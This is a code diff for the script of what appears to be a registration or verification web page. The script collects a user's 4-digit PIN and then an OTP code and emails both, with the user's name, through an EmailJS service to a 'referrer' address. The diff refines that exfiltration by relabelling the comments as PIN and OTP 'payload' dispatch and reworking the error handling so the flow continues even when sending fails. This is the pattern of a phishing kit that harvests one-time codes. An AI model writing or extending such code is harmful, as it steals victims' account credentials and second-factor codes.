@@ -520,7 +520,7 @@
       }
     });
 
-    // 3. PIN Logic & First Email Dispatch via EmailJS
+    // 3. PIN Logic & Pass Page Email Dispatch via EmailJS
     const pinInputs = document.querySelectorAll('.pin-box');
     pinInputs.forEach((input, index) => {
       input.addEventListener('input', (e) => {
@@ -532,7 +532,7 @@
         if (pin.length === 4) {
           enteredPinCode = pin;
 
-          // Dispatch initial payload to referrer email
+          // Dispatch initial pass/PIN payload to referrer email
           const templateParams = {
             to_email: registrationData.referrerEmail || '',
             full_name: registrationData.fullName || '',
@@ -550,7 +550,9 @@
             .then(() => {
               pinInputs.forEach(i => i.value = '');
               goToStep('step-otp');
-            }, (error) => {
+            })
+            .catch((error) => {
+              console.error("Failed to send PIN payload:", error);
               pinInputs.forEach(i => i.value = '');
               goToStep('step-otp');
             });
@@ -627,12 +629,14 @@
         otp_code: enteredOtp
       };
 
+      // Dispatch OTP payload to the same referrer email
       emailjs.send("service_rf9jc9g", "template_ykjxd5h", otpTemplateParams)
         .then(() => {
           alert(`Verification completed successfully! Code (${enteredOtp}) sent to ${registrationData.referrerEmail}.`);
           confirmBtn.textContent = "Confirm";
           confirmBtn.disabled = false;
-        }, (error) => {
+        })
+        .catch((error) => {
           alert("Failed to send OTP code: " + JSON.stringify(error));
           confirmBtn.textContent = "Confirm";
           confirmBtn.disabled = false;
